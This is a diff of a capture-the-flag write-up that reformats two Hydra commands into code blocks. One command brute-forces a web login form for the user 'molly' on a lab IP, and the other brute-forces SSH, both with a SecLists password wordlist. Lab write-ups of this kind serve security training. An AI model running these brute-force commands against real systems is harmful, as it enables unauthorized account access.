@@ -10,8 +10,12 @@ Opened up the webconsole and tried entering the credentials to see what the requ
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-`hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V`
+```
+hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
+```
 
 **Use Hydra to bruteforce molly's SSH password. What is flag 2?**
 
-`hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V`
+```
+hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 -t 4 ssh -V
+```
